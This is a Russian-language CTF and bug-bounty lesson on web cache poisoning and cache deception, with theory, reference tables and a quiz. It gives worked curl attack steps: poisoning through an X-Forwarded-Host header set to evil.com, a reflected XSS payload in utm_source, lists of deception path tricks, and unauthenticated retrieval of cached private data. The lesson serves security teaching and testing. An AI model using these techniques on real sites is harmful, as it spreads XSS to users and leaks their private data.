---
id: web-cache-poisoning
title: "Web Cache Poisoning и Cache Deception"
category: web
parent: web-waf-smuggling
difficulty: hard
order: 1
tags: [cache-poisoning, cache-deception, cdn, x-cache, unkeyed, varnish]
prerequisites: [web-waf-bypass, web-host-header]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как отравить кэш неучтённым заголовком или обмануть его, чтобы он закэшировал приватные данные."
---

Кэш (CDN, Varnish, nginx proxy_cache) хранит ответы и отдаёт их многим пользователям. Если кэш-ключ не учитывает какой-то вход, от которого зависит ответ, атакующий может «отравить» закэшированную копию и она уйдёт всем. Обратная атака — **cache deception** — заставляет кэш сохранить приватные данные жертвы. Оба класса — про рассинхронизацию того, что кэшируется, и того, что кэш учитывает.

## Теория: кэш-ключ и «неучтённые» входы

Кэш определяет, что хранить, по **cache key** (обычно метод + путь + Host + иногда `Accept-Encoding`). Всё остальное — **unkeyed inputs**: заголовки, cookies, query-параметры, не входящие в ключ. Если ответ **зависит** от unkeyed input, но кэшируется, возникает **cache poisoning**.

Пример: приложение отражает `X-Forwarded-Host` в HTML, а кэш игнорирует этот заголовок. Отправив:

```
GET / HTTP/1.1
Host: target
X-Forwarded-Host: evil.com
```

вы получите HTML со ссылками на `evil.com`, и кэш сохранит этот ответ для **всех**. Другие пользователи получат отравленную страницу (open redirect/XSS/poisoned JS).

Другие типичные unkeyed inputs: `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Cookie` (если не в ключе), параметры вроде `?utm_*`, `Accept-Language`.

## Теория: Cache Deception

**Cache deception** — наоборот: заставить кэш сохранить **приватный** ответ, добавив к пути «статическое» расширение:

```
GET /account/profile.css
```

Приложение (по правилам роутинга) отдаёт профиль жертвы (игнорируя `.css`), а CDN считает `.css` статикой и кэширует. Затем атакующий запрашивает тот же URL и получает данные жертвы. Варианты: `.css`, `.js`, `.png`, `/foo/..%2fprofile`, `;.css`.

## Инструменты: заголовки кэша и Param Miner

Смотреть, кэшируется ли ответ и по какому ключу:

```bash
curl -s -i https://target.local/ | grep -iE 'x-cache|cf-cache-status|age|cache-control|vary|akamai'
```

- `X-Cache: HIT/MISS`, `CF-Cache-Status: HIT/MISS` — статус кэша.
- `Age: N` — сколько секунд объект в кэше.
- `Cache-Control`, `Vary` — правила кэширования.

Искать unkeyed inputs — **Param Miner** (Burp): он перебирает заголовки/параметры и смотрит, влияют ли они на ответ. Аналог — ручной перебор заголовков и сравнение ответов.

Проверка отравления (на своём стенде/в рамках scope, аккуратно):

```bash
# 1) отправить «отравляющий» запрос
curl -s -o /dev/null https://target.local/?cb=1 -H 'X-Forwarded-Host: evil.com'
# 2) запросить «чисто» и проверить, вернулся ли отравленный ответ из кэша
curl -s https://target.local/?cb=1 | grep -o 'evil.com'
```

Уникальный `?cb=` (cache buster) гарантирует, что вы не затронете реальных пользователей.

## Разобранный пример: отравление через X-Forwarded-Host

Шаг 1. Проверяем, отражается ли заголовок и кэшируется ли ответ:

```bash
curl -s -i https://target.local/ -H 'X-Forwarded-Host: evil.com' | grep -iE 'evil.com|x-cache|age'
```

Видим `evil.com` в HTML и `X-Cache: MISS` → ответ отражает заголовок.

Шаг 2. Добавляем cache buster (чтобы не задеть других) и «отравляем»:

```bash
curl -s -o /dev/null 'https://target.local/?x=123' -H 'X-Forwarded-Host: evil.com'
curl -s -o /dev/null 'https://target.local/?x=123'   # прогрев
curl -s -i 'https://target.local/?x=123' | grep -iE 'evil.com|x-cache'
# X-Cache: HIT и evil.com => кэш отравлен для этого URL
```

Шаг 3. Доказываем impact: отравленная страница содержит ссылку/скрипт на `evil.com` (open redirect/XSS). В отчёте — точные запросы и ответы. **Никогда не травите общий URL без cache buster** — это заденет живых пользователей.

## Разобранный пример: cache deception

Шаг 1. Смотрим страницу с приватными данными (свой аккаунт):

```bash
curl -s -i https://target.local/account -b 'session=me' | grep -iE 'cache-control|x-cache'
```

Шаг 2. Добавляем «статическое» расширение:

```bash
curl -s -i https://target.local/account.css -b 'session=me' | grep -iE 'x-cache|cache-control'
# X-Cache: MISS -> затем HIT, Cache-Control: public
```

Если ответ закэшировался (`public`), а приложение вернуло те же приватные данные — deception работает. Шаг 3. Запрашиваем без cookie:

```bash
curl -s https://target.local/account.css
# возвращает приватные данные из кэша => утечка
```

На реальном тесте используйте свой аккаунт и уникальный URL; в отчёте покажите, что кэш отдаёт приватные данные без аутентификации.

## Частые ошибки

- **Травить общий URL.** Всегда используйте уникальный cache buster (`?cb=<random>`), иначе заденете пользователей.
- **Путать poisoning и deception.** Poisoning — вы кладёте своё в кэш; deception — кэш сохраняет чужое приватное.
- **Не смотреть `Vary`.** Если `Vary: X-Forwarded-Host` есть, заголовок — часть ключа, и poisoning не сработает.
- **Игнорировать `Age`/`X-Cache`.** Без понимания статуса кэша вы не поймёте, сработало ли.
- **Забывать про Host-цепочку.** Cache poisoning часто идёт рука об руку с host-header атаками (см. `web-host-header`).
- **Считать, что кэша нет.** CDN и reverse-proxy кэшируют чаще, чем кажется; проверяйте заголовки.

## Полный разбор: poisoning через неучтённый параметр (с выводом)

Помимо заголовков, кэш-ключ может не учитывать **query-параметры**, которые всё же влияют на ответ (например, аналитические `utm_*` или `?lang=`). Проверяем.

Шаг 1. Ищем параметр, отражающийся в ответе, и смотрим кэш-заголовки:

```bash
curl -s -i 'https://target.local/?utm_source=x' | grep -iE 'x-cache|cf-cache-status|age|cache-control|vary'
# x-cache: MISS
# cache-control: public, max-age=120
# vary: Accept-Encoding        (Vary без query — параметр может быть unkeyed)
```

Шаг 2. Проверяем, влияет ли параметр на тело:

```bash
curl -s 'https://target.local/?utm_source=<script>alert(1)</script>' | grep -o 'alert(1)'
# alert(1)   -> отражается и, вероятно, кэшируется
```

Шаг 3. С уникальным cache buster отравляем кэш (на своём/в scope):

```bash
# «отравляющий» запрос
curl -s -o /dev/null 'https://target.local/?utm_source=<script>alert(1)</script>&cb=UNIQUE123'
# прогрев
curl -s -o /dev/null 'https://target.local/?cb=UNIQUE123'
# проверка
curl -s -i 'https://target.local/?cb=UNIQUE123' | grep -iE 'x-cache|alert\(1\)'
# x-cache: HIT
# ... alert(1) ...   -> кэш отравлен для этого URL
```

Шаг 4. Доказываем impact: любой пользователь, открывший `?cb=UNIQUE123` (или общий URL без buster), получит XSS/redirect из кэша.

## Reference-таблица: unkeyed inputs и заголовки кэша

**Частые unkeyed inputs (перебирайте):**

| Вход | Эффект |
|------|--------|
| `X-Forwarded-Host` / `X-Forwarded-Server` | host-based XSS/redirect |
| `X-Forwarded-Scheme` / `X-Forwarded-Proto` | подмена схемы, SSRF |
| `X-Host` / `X-Original-URL` / `X-Rewrite-URL` | подмена пути/хоста |
| `X-Forwarded-Port` | подмена порта |
| `Accept-Language` / `Accept` | разный контент |
| `Cookie` (если не в ключе) | персонализация |
| `?utm_*`, `?lang`, `?cb`, `?debug` | отражение в теле |
| `X-HTTP-Method-Override` | смена метода |

**Заголовки кэша (наблюдаемые):**

| Заголовок | Значение |
|-----------|----------|
| `X-Cache` / `X-Cache-Status` | HIT/MISS (Varnish/nginx) |
| `CF-Cache-Status` | HIT/MISS/EXPIRED (Cloudflare) |
| `Age` | сколько секунд объект в кэше |
| `Cache-Control` | `public`/`private`/`no-store`, `max-age` |
| `Vary` | какие заголовки входят в ключ |
| `Via` | цепочка прокси |
| `X-Served-By` | какой узел отдал (Fastly) |

## Cache deception: полный список расширений и обходов

Приложение игнорирует «статический» суффикс, а кэш — нет:

```text
/account.css   /account.js   /account.png   /account.ico   /account.svg
/account/foo.css   /account;.css   /account%2f.css
/account/..%2faccount   /account%00.css   /account/.
```

Проверка: запросить с cookie и посмотреть `X-Cache`/`Cache-Control`, затем — без cookie:

```bash
curl -s -i 'https://target.local/account.css' -b 'session=me' | grep -iE 'x-cache|cache-control'
curl -s 'https://target.local/account.css' | head   # приватные данные без auth?
```

Дополнительные приёмы deception:
- **`?` и `#` в пути:** `/account%23.css`, `/account?.css`.
- **Разные разделители:** `;`, `,`, `%09`.
- **Двойное расширение:** `/account.css.php` (если роутинг берёт первое расширение).
- **Path normalization расхождения:** кэш нормализует путь иначе, чем приложение.

## Fat GET, response splitting, внутренние кэши

- **Fat GET:** GET-запрос с телом; некоторые серверы учитывают тело, а кэш — нет (тело становится unkeyed).
- **HTTP response splitting / CRLF:** инъекция `\r\n` в заголовок, который кэшируется, может расщепить ответ.
- **Кэш на разных слоях:** браузерный, CDN, reverse-proxy, application-level (например, Django cache, Rails cache) — каждый может кэшировать своё; расхождения между слоями дают баги.
- **Кэш ошибок:** если кэшируется 404/500 с отражённым вводом — poisoning через error-страницы.
- **Cache key normalization:** расхождения в декодировании `%2f`/`%252f`, регистре пути, trailing slash — частый источник deception.

## Что делать дальше / решение

1. **Определить, есть ли кэш** (`X-Cache`/`CF-Cache-Status`/`Age`).
2. **Найти `Vary`** — что уже в ключе; остальное — кандидаты в unkeyed.
3. **Перебрать заголовки/параметры** (Param Miner) и сравнить ответы.
4. **Отравлять только с cache buster** (`?cb=<random>`) — не задевайте пользователей.
5. **Проверить deception** (`/private.css`) — закэшировался ли приватный ответ.
6. **Оформить impact** (XSS/redirect для всех или утечка приватных данных) с точными запросами.
7. **Не травить общий URL** и не оставлять за собой отравленный кэш — при необходимости очистите buster-URL.

## Внутренние кэши приложений и отладка

Кэш бывает не только на CDN. Приложение может кэшировать фрагменты (Django `cache`, Rails `cache_store`, `node-cache`, Redis-backed page cache). Это даёт дополнительные векторы:

- **Кэш фрагментов по URL/параметру:** если ключ не включает пользователя, один пользователь может получить закэшированный фрагмент другого.
- **Кэш ответов API:** `Cache-Control` на API-ответах с приватными данными → deception.
- **Кэш ошибок:** закэшированный 404/500 с отражённым вводом → отравление error-страницы.
- **Кэш-ключ и cookies:** если cookie не в ключе, персонализация «протекает» между пользователями.

Отладка: ищите `Cache-Control`, `Vary`, `Age` не только на главной, но и на API-ручках и статике. Сравнивайте ответ с cookie и без — расхождения выдают некорректный ключ. Всегда держите под рукой уникальный cache buster и в конце теста проверяйте, что не оставили отравленный общий URL.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое unkeyed input?"
  options:
    - "Вход, не входящий в cache key, но влияющий на ответ"
    - "Зашифрованный параметр"
    - "Cookie с флагом HttpOnly"
    - "HTTP/2-поток"
  answer: 0
  explanation: "Кэш его не учитывает, а ответ от него зависит → можно отравить."
- question: "Как отравить кэш безопасно для теста?"
  options:
    - "Использовать уникальный cache buster"
    - "Травить главную страницу"
    - "Отправить один запрос"
    - "Отключить кэш"
  answer: 0
  explanation: "Уникальный `?cb=` изолирует отравление от реальных пользователей."
- question: "В чём суть cache deception?"
  options:
    - "Заставить кэш сохранить приватный ответ жертвы"
    - "Ускорить сайт"
    - "Обойти WAF"
    - "Сжать ответ"
  answer: 0
  explanation: "Добавив `.css`/`.js`, вы заставляете кэш считать ответ статикой и сохранить его."
- question: "Какой заголовок показывает статус кэша у Cloudflare?"
  options:
    - "`Server`"
    - "`CF-Cache-Status`"
    - "`X-Powered-By`"
    - "`Content-Length`"
  answer: 1
  explanation: "`CF-Cache-Status: HIT/MISS` (у других — `X-Cache`)."
- question: "Что мешает poisoning, если заголовок в `Vary`?"
  options:
    - "Ничего"
    - "`Vary` включает заголовок в ключ кэша, поэтому разные значения кэшируются отдельно"
    - "`Vary` отключает кэш"
    - "`Vary` шифрует ответ"
  answer: 1
  explanation: "Заголовок становится частью cache key."
```

## Где пригодится

- **CTF (Web):** cache poisoning/deception — популярные сложные задачи на CDN.
- **Bug bounty:** отравление кэша (XSS/redirect для всех) и утечка через deception — высокие выплаты.
- **Пентест:** анализ кэш-ключей и `Vary` — часть тестирования CDN-инфраструктуры.
- **Работа (AppSec/Dev):** корректный `Vary`, `Cache-Control: private` для приватных страниц — базовый харденинг.
